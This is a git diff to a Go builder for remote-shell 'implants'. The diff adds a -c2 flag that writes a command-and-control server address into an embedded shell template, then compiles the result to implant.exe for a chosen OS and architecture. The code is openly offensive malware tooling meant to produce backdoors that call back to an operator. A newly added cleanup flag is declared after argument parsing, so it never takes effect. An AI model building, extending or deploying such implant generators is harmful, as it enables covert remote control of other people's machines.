@@ -8,8 +8,13 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
+	"strings"
 
 	"github.com/gobuffalo/packr"
+)
+
+const (
+	templateC2 = "__c2__"
 )
 
 var (
@@ -19,13 +24,18 @@ var (
 func main() {
 	osPtr := flag.String("os", "", "target operating system")
 	archPtr := flag.String("arch", "amd64", "target cpu architecture")
+	c2 := flag.String("c2", "127.0.0.1:1337", "c2 server")
+	output := flag.String("output", "implant.exe", "output file")
 	flag.Parse()
 
 	log.Printf("extracting assets ...")
 	gshellDir := setup()
 	defer func() {
 		log.Printf("cleaning up assets in: %s", gshellDir)
-		// os.RemoveAll(gshellDir)
+		noCleanPtr := flag.Bool("no-clean", false, "do not cleanup tmp files")
+		if !(*noCleanPtr) {
+			os.RemoveAll(gshellDir)
+		}
 	}()
 	log.Printf("extracted assets to: %s", gshellDir)
 
@@ -34,18 +44,22 @@ func main() {
 		GOARCH: *archPtr,
 		GOROOT: fmt.Sprintf("%s/go", gshellDir),
 	}
-	generateImplant(gshellDir, config)
+	generateImplant(gshellDir, *c2, *output, config)
 }
 
-func generateImplant(gshellDir string, config GoConfig) {
+func generateImplant(gshellDir string, c2 string, output string, config GoConfig) {
 
 	shellID := randomID(8)
 	log.Printf("creating shell with ID: %s", shellID)
 	shellBox := packr.NewBox("./assets/shell")
+
 	shellGo, err := shellBox.MustString("shell.go")
 	if err != nil {
 		panic(err)
 	}
+	shellGo = strings.Replace(shellGo, templateC2, c2, -1)
+	log.Printf("rendered shell with c2 = '%s'", c2)
+
 	shellDir := fmt.Sprintf("%s/shells/%s", gshellDir, shellID)
 	err = os.MkdirAll(shellDir, os.ModePerm)
 	if err != nil {
@@ -60,8 +74,7 @@ func generateImplant(gshellDir string, config GoConfig) {
 	}
 
 	cwd, _ := os.Getwd()
-	outputPtr := flag.String("output", "implant.exe", "output file")
-	gobuild(config, shellDir, fmt.Sprintf("%s/%s", cwd, *outputPtr))
+	gobuild(config, shellDir, fmt.Sprintf("%s/%s", cwd, output))
 }
 
 func randomID(n int) string {
